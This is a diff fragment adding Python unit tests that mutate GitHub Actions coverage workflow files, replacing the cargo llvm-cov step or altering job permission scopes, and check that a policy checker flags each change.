+        self.assertTrue(_producer_step_matches(live_step, "llvm-cov"))
+        anchor = (
+            "        cargo llvm-cov --package aw_editor --lib --lcov --output-path lcov.info\n"
+        )
+        self.assertEqual(text.count(anchor), 1)
+        mutant = text.replace(anchor, "        echo not-llvm-cov\n", 1)
+        job = self._assert_producer_rejected(mutant, "aw-editor-tests.yml", "llvm-cov kind")
+        self.assertEqual(len(job["steps"]), len(kinds))
+        step = next(item for item, kind in zip(job["steps"], kinds) if kind == "llvm-cov")
+        self.assertFalse(_run_text(step).lstrip().startswith("cargo llvm-cov"))
+        self.assertFalse(_producer_step_matches(step, "llvm-cov"))
+        self.assertTrue(_producer_upload_name_ok(job, "aw-editor-lcov"))
+        self.assertFalse(_producer_sequence_ok(job, "aw-editor-tests.yml"))
+
+    def test_producer_permissions_reject_an_added_read_scope(self) -> None:
+        """An added read scope on the producer job is flagged.
+
+        The write check does not see it. Removing or changing contents: read
+        is flagged by the same exact map.
+        """
+        added = {
+            "coverage.yml": (
+                "  coverage:\n    name: Generate Code Coverage\n    permissions:\n"
+                "      contents: read\n",
+                "  coverage:\n    name: Generate Code Coverage\n    permissions:\n"
+                "      contents: read\n"
+                "      actions: read\n",
+            ),
+            "aw-editor-tests.yml": (
+                "  coverage:\n    name: Test Coverage\n    permissions:\n"
+                "      contents: read\n",
+                "  coverage:\n    name: Test Coverage\n    permissions:\n"
+                "      contents: read\n"
+                "      pull-requests: read\n",
+            ),
+        }
+        for path, (anchor, replacement) in added.items():
+            text = (WORKFLOWS / path).read_text(encoding="utf-8")
+            self.assertEqual(text.count(anchor), 1, path)
+            self.assertNotIn(
+                PRODUCER_PERMISSIONS_MSG,
+                " ".join(coverage_permission_violations(text, path=path)),
+                path,
+            )
+            mutant = text.replace(anchor, replacement, 1)
+            self.assertNotEqual(mutant, text, path)
+            job = self._coverage_job(mutant, path)
+            expected = (
+                {"contents", "actions"}
+                if path == "coverage.yml"
+                else {"contents", "pull-requests"}
+            )
+            self.assertEqual(set(job["permissions"]), expected, path)
+            self.assertTrue(_producer_job_keys_ok(job), path)
+            messages = " ".join(coverage_permission_violations(mutant, path=path))
+            self.assertIn(PRODUCER_PERMISSIONS_MSG, messages, path)
+            self.assertNotIn(COVERAGE_WRITE_MSG, messages, path)
+        text = (WORKFLOWS / "coverage.yml").read_text(encoding="utf-8")
+        changed = text.replace(
+            "  coverage:\n    name: Generate Code Coverage\n    permissions:\n"
+            "      contents: read\n",
+            "  coverage:\n    name: Generate Code Coverage\n    permissions:\n"
+            "      contents: none\n",
+            1,
+        )
+        removed = text.replace(
+            "  coverage:\n    name: Generate Code Coverage\n    permissions:\n"
+            "      contents: read\n",
+            "  coverage:\n    name: Generate Code Coverage\n    permissions: {}\n",
+            1,
+        )
+        for label, mutant in (("changed", changed), ("removed", removed)):
+            messages = " ".join(coverage_permission_violations(mutant, path="coverage.yml"))
+            self.assertIn(PRODUCER_PERMISSIONS_MSG, messages, label)
+            self.assertNotIn(COVERAGE_WRITE_MSG, messages, label)
 
 
 if __name__ == "__main__":
